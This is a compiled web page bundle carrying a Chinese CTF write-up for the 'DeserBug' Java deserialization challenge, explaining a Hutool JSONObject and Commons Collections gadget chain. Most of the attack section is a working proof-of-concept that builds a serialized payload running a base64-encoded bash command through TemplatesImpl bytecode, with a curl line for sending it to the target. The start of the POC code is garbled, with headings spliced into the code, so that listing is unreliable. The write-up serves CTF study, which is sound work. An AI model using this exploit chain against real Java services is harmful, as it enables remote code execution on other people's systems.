import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as t,o as p}from"./app-_WqHyd2I.js";const e={};function o(c,n){return p(),a("div",null,[...n[0]||(n[0]=[t(`<h1 id="ctf-deserbug" tabindex="-1"><a class="header-anchor" href="#ctf-deserbug"><span>CTF - DeserBug</span></a></h1><h2 id="目录" tabindex="-1"><a class="header-anchor" href="#目录"><span>目录</span></a></h2><ul><li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li><li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">解题思路</a></li><li><a href="#%E5%AE%8C%E6%95%B4poc%E5%AE%9E%E7%8E%B0">完整POC实现</a></li><li><a href="#%E5%85%B3%E9%94%AE%E6%9C%BA%E5%88%B6%E8%A7%A3%E6%9E%90">关键机制解析</a></li><li><a href="#cc%E9%93%BE%E6%BC%94%E5%8F%98%E5%88%86%E6%9E%90">CC链演变分析</a></li></ul><hr><h2 id="题目分析" tabindex="-1"><a class="header-anchor" href="#题目分析"><span>题目分析</span></a></h2><h3 id="题目环境" tabindex="-1"><a class="header-anchor" href="#题目环境"><span>题目环境</span></a></h3><ul><li><strong>Web服务</strong>: Hutool HTTP Server (端口8888)</li><li><strong>依赖</strong>: Commons Collections 3.2.2 (带安全检查) hutool-all-5.8.18</li><li><strong>JDK</strong>: JDK1.8.0_202</li><li><strong>提示</strong>: <code>cn.hutool.json.JSONObject.put</code> → <code>com.app.Myexpect#getAnyexcept</code></li></ul><h3 id="题目提供的关键文件" tabindex="-1"><a class="header-anchor" href="#题目提供的关键文件"><span>题目提供的关键文件</span></a></h3><h4 id="_1-testapp-java-存在反序列化漏洞的web服务" tabindex="-1"><a class="header-anchor" href="#_1-testapp-java-存在反序列化漏洞的web服务"><span>1. Testapp.java - 存在反序列化漏洞的Web服务</span></a></h4><pre><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Testapp</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">HttpUtil</span><span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAction</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> bugstr <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParam</span><span class="token punctuation">(</span><span class="token string">&quot;bugstr&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token comment">// 【漏洞点】直接反序列化用户输入</span>
                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>bugstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Object</span> object <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                result <span class="token operator">=</span> object<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 【关键提示】异常处理中使用Myexpect</span>
                <span class="token class-name">Myexpect</span> myexpect <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Myexpect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                myexpect<span class="token punctuation">.</span><span class="token function">setTypeparam</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                myexpect<span class="token punctuation">.</span><span class="token function">setTypearg</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                myexpect<span class="token punctuation">.</span><span class="token function">setTargetclass</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                result <span class="token operator">=</span> myexpect<span class="token punctuation">.</span><span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            response<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token class-name">ContentType</span><span class="token punctuation">.</span><span class="token constant">TEXT_PLAIN</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><h4 id="_2-myexpect-java-题目提供的反射工具类" tabindex="-1"><a class="header-anchor" href="#_2-myexpect-java-题目提供的反射工具类"><span>2. Myexpect.java - 题目提供的反射工具类</span></a></h4><pre><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Myexpect</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">Class</span> targetclass<span class="token punctuation">;</span>      <span class="token comment">// 目标类</span>
    <span class="token keyword">private</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> typeparam<span class="token punctuation">;</span>      <span class="token comment">// 构造器参数类型</span>
    <span class="token keyword">private</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> typearg<span class="token punctuation">;</span>       <span class="token comment">// 构造器参数值</span>
    
    <span class="token comment">// 【核心方法】通过反射调用任意构造器</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">Constructor</span> con <span class="token operator">=</span> targetclass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>typeparam<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> con<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>typearg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token comment">// Getter/Setter省略...</span>
<span class="token punctuation">}</span>
</code></pre><hr><h2 id="漏洞分析" tabindex="-1"><a class="header-anchor" href="#漏洞分析"><span>漏洞分析</span></a></h2><h3 id="漏洞点" tabindex="-1"><a class="header-anchor" href="#漏洞点"><span>漏洞点</span></a></h3><pre><code class="language-java"><span class="token comment">// Testapp.java - 反序列化入口</span>
<span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span> object <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 危险的反序列化操作</span>
</code></pre><h3 id="题目约束" tabindex="-1"><a class="header-anchor" href="#题目约束"><span>题目约束</span></a></h3><p>Commons Collections 3.2.2 的安全限制：</p><ul><li>❌ <code>InvokerTransformer</code> - 反射调用方法（已禁用）</li><li>❌ <code>InstantiateTransformer</code> - 反射调用构造器（已禁用）</li><li>✅ <code>ConstantTransformer</code> - 仅返回常量（可用）</li></ul><h3 id="突破点" tabindex="-1"><a class="header-anchor" href="#突破点"><span>突破点</span></a></h3><p>题目提供的 <code>Myexpect</code> 类：</p><ul><li>✅ 可序列化（继承自Exception）</li><li>✅ 提供 <code>getAnyexcept()</code> 方法反射调用任意构造器</li><li>✅ 不受CC 3.2.2安全检查限制</li></ul><p><strong>关键提示</strong>：<code>cn.hutool.json.JSONObject.put</code> → <code>com.app.Myexpect#getAnyexcept</code></p><hr><h2 id="解题思路" tabindex="-1"><a class="header-anchor" href="#解题思路"><span>解题思路</span></a></h2><h3 id="核心思路" tabindex="-1"><a class="header-anchor" href="#核心思路"><span>核心思路</span></a></h3><p>使用 <code>Myexpect</code> 替代被禁用的 <code>InstantiateTransformer</code>，利用 Hutool JSONObject 的 JSON 序列化机制自动触发 getter 方法。</p><h3 id="技术选型" tabindex="-1"><a class="header-anchor" href="#技术选型"><span>技术选型</span></a></h3><table><thead><tr><th>组件</th><th>选择</th><th>原因</th></tr></thead><tbody><tr><td>触发方式</td><td>CC6 (HashMap + TiedMapEntry + LazyMap)</td><td>JDK通用，触发稳定</td></tr><tr><td>攻击目标</td><td>CC3 (TrAXFilter + TemplatesImpl)</td><td>构造器触发，适配Myexpect</td></tr><tr><td>绕过手段</td><td>ConstantTransformer + JSONObject</td><td>返回Myexpect对象，JSON序列化触发getter</td></tr></tbody></table><h3 id="完整利用链" tabindex="-1"><a class="header-anchor" href="#完整利用链"><span>完整利用链</span></a></h3><pre><code>HashMap.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get(key)
      → ConstantTransformer.transform()  // 返回Myexpect对象
        → JSONObject.put(key, myexpect)  // JSON序列化触发
          → Myexpect.getAnyexcept()      // 反射调用构造器
            → new TrAXFilter(templates)
              → TemplatesImpl.newTransformer()
                → 加载恶意字节码 → RCE ✅
</code></pre><hr><h3 id="mypoc-java-题目答案" tabindex="-1"><a class="header-anchor" href="#mypoc-java-题目答案"><span>MyPOC.java (题目答案)</span></a></h3><pre><code class="language-java">publiPOC实现

### <span class="token class-name">MyPOC</span><span class="token punctuation">.</span>java节码（执行命令）
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">getTemplates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">&quot;_name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">&quot;_bytecodes&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 步骤2: 配置Myexpect调用TrAXFilter构造器</span>
        <span class="token class-name">Myexpect</span> myexpect <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Myexpect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myexpect<span class="token punctuation">.</span><span class="token function">setTargetclass</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// 目标类</span>
        myexpect<span class="token punctuation">.</span><span class="token function">setTypeparam</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 参数类型</span>
        myexpect<span class="token punctuation">.</span><span class="token function">setTypearg</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 参数值</span>
        
        <span class="token comment">// 步骤3: 构造LazyMap触发链</span>
        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ConstantTransformer</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">LazyMap</span> lazyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LazyMap</span><span class="token punctuation">)</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>jsonObject<span class="token punctuation">,</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 步骤4: 利用HashMap触发</span>
        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        jsonObject<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 确保LazyMap.get()会调用transform</span>
        
        <span class="token comment">// 步骤5: 替换ConstantTransformer的返回值为Myexpect</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span> <span class="token string">&quot;iConstant&quot;</span><span class="token punctuation">,</span> myexpect<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 步骤6: 序列化并生成payload</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialize <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token comment">// 生成恶意字节码</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getTemplates</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> template <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">&quot;Test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> block <span class="token operator">=</span> <span class="token string">&quot;Runtime.getRuntime().exec(\\&quot;bash -c {echo,b3BlbiAtYSBDYWxjdWxhdG9y}|{base64,-d}|{bash,-i}\\&quot;);&quot;</span><span class="token punctuation">;</span>
        template<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> template<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><h3 id="poc关键点解析" tabindex="-1"><a class="header-anchor" href="#poc关键点解析"><span>POC关键点解析</span></a></h3><h4 id="_1-时序控制" tabindex="-1"><a class="header-anchor" href="#_1-时序控制"><span>1. 时序控制</span></a></h4><pre><code class="language-java">hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 构造时触发，避免污染序列化数据</span>
jsonObject<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 清除key，确保反序列化时触发transform</span>
<span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span> <span class="token string">&quot;iConstant&quot;</span><span class="token punctuation">,</span> myexpect<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 替换返回值</span>
</code></pre><h4 id="_2-使用方法" tabindex="-1"><a class="header-anchor" href="#_2-使用方法"><span>2. 使用方法</span></a></h4><pre><code class="language-bash">javac <span class="token parameter variable">-cp</span> <span class="token string">&quot;lib/*:src&quot;</span> src/com/app/MyPOC.java
<span class="token function">java</span> <span class="token parameter variable">-cp</span> <span class="token string">&quot;lib/*:src&quot;</span> com.app.MyPOC
<span class="token function">curl</span> <span class="token string">&quot;http://target:8888/?bugstr=&lt;base64_payload&gt;&quot;</span>
</code></pre><hr><h2 id="关键机制解析" tabindex="-1"><a class="header-anchor" href="#关键机制解析"><span>关键机制解析</span></a></h2><h3 id="_1-jsonobject-put-为什么能触发-getanyexcept" tabindex="-1"><a class="header-anchor" href="#_1-jsonobject-put-为什么能触发-getanyexcept"><span>1. JSONObject.put 为什么能触发 getAnyexcept()？</span></a></h3><p>这是本题的核心突破点。</p><h4 id="java-bean-规范" tabindex="-1"><a class="header-anchor" href="#java-bean-规范"><span>Java Bean 规范</span></a></h4><pre><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Myexpect</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>  <span class="token comment">// ✅ 符合getter规范</span>
    <span class="token comment">// 特征：以&quot;get&quot;开头、无参数、有返回值</span>
<span class="token punctuation">}</span>
</code></pre><h4 id="hutool-json序列化机制" tabindex="-1"><a class="header-anchor" href="#hutool-json序列化机制"><span>Hutool JSON序列化机制</span></a></h4><pre><code class="language-java"><span class="token comment">// JSONObject.put() 内部逻辑</span>
<span class="token keyword">public</span> <span class="token class-name">JSONObject</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>value是自定义对象<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 调用BeanUtil.beanToMap()</span>
        <span class="token comment">// 1. 反射获取所有public方法</span>
        <span class="token comment">// 2. 过滤出getter方法 (method.getName().startsWith(&quot;get&quot;))</span>
        <span class="token comment">// 3. 逐个调用getter获取属性值</span>
        <span class="token comment">// 4. getAnyexcept()也会被调用！✅</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><h4 id="触发时机" tabindex="-1"><a class="header-anchor" href="#触发时机"><span>触发时机</span></a></h4><pre><code class="language-java"><span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span>
  → transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span>     <span class="token comment">// 返回Myexpect对象</span>
    → jsonObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">,</span> myexpect<span class="token punctuation">)</span>  <span class="token comment">// ← 触发点</span>
      → <span class="token class-name">BeanUtil</span><span class="token punctuation">.</span><span class="token function">beanToMap</span><span class="token punctuation">(</span>myexpect<span class="token punctuation">)</span>
        → <span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 被调用！✅
</code></pre><p><strong>关键点</strong>：使用 JSONObject 作为 LazyMap 的底层 Map</p><ul><li>普通HashMap不会触发getter</li><li>JSONObject.put 会序列化对象，自动调用所有getter</li></ul><hr><h3 id="_2-jsonobject-remove-111-的作用" tabindex="-1"><a class="header-anchor" href="#_2-jsonobject-remove-111-的作用"><span>2. jsonObject.remove(&quot;111&quot;) 的作用</span></a></h3><h4 id="嵌套结构" tabindex="-1"><a class="header-anchor" href="#嵌套结构"><span>嵌套结构</span></a></h4><pre><code>HashMap
  └─ key: TiedMapEntry
       └─ map: LazyMap
            └─ map: JSONObject (底层存储)
</code></pre><h4 id="执行时序" tabindex="-1"><a class="header-anchor" href="#执行时序"><span>执行时序</span></a></h4><p><strong>构造阶段</strong>：</p><pre><code class="language-java">hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token comment">// → lazyMap.get(&quot;111&quot;)</span>
<span class="token comment">// → jsonObject.put(&quot;111&quot;, 1)  // jsonObject现在包含&quot;111&quot;</span>
</code></pre><p><strong>清理阶段</strong>：</p><pre><code class="language-java">jsonObject<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 从JSONObject移除&quot;111&quot;</span>
</code></pre><p><strong>反序列化阶段</strong>：</p><pre><code class="language-java"><span class="token comment">// 因为jsonObject不包含&quot;111&quot;</span>
lazyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span>
  → <span class="token operator">!</span>jsonObject<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span>  <span class="token comment">// true</span>
  → transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span>     <span class="token comment">// 会被调用</span>
</code></pre><p><strong>如果不remove</strong>：<code>LazyMap.get()</code> 直接返回已存在的值，不会调用 <code>transform()</code>，攻击失败。</p><hr><h3 id="_3-为什么选择-traxfilter-templatesimpl" tabindex="-1"><a class="header-anchor" href="#_3-为什么选择-traxfilter-templatesimpl"><span>3. 为什么选择 TrAXFilter + TemplatesImpl？</span></a></h3><h4 id="myexpect-的限制" tabindex="-1"><a class="header-anchor" href="#myexpect-的限制"><span>Myexpect 的限制</span></a></h4><pre><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token class-name">Constructor</span> con <span class="token operator">=</span> targetclass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>typeparam<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> con<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>typearg<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 只能调用构造器</span>
<span class="token punctuation">}</span>
</code></pre><h4 id="runtime-exec-不可行" tabindex="-1"><a class="header-anchor" href="#runtime-exec-不可行"><span>Runtime.exec() 不可行</span></a></h4><pre><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Runtime</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">Runtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment">// 构造器private</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Runtime</span> <span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>  <span class="token comment">// 需要静态方法</span>
    <span class="token keyword">public</span> <span class="token class-name">Process</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>  <span class="token comment">// 需要方法调用</span>
<span class="token punctuation">}</span>
</code></pre><ul><li>Myexpect只能调用构造器，无法调用普通方法</li><li>Runtime构造器是private的</li></ul><h4 id="traxfilter-完美适配" tabindex="-1"><a class="header-anchor" href="#traxfilter-完美适配"><span>TrAXFilter 完美适配</span></a></h4><pre><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">TrAXFilter</span><span class="token punctuation">(</span><span class="token class-name">Templates</span> templates<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    _transformer <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 构造器中自动触发！</span>
<span class="token punctuation">}</span>
</code></pre><ul><li>构造器是public的 ✅</li><li>构造器内部自动调用 <code>templates.newTransformer()</code> ✅</li><li>触发 TemplatesImpl 字节码加载 ✅</li></ul><hr><h2 id="反序列化链拼接原理" tabindex="-1"><a class="header-anchor" href="#反序列化链拼接原理"><span>反序列化链拼接原理</span></a></h2><h3 id="链的基本结构" tabindex="-1"><a class="header-anchor" href="#链的基本结构"><span>链的基本结构</span></a></h3><p>任何反序列化攻击链都可以分解为三个独立模块：</p><pre><code>[触发器 Trigger] → [传递机制 Chain] → [攻击目标 Sink]
       ↓                 ↓                  ↓
    入口点          Transformer          危险操作
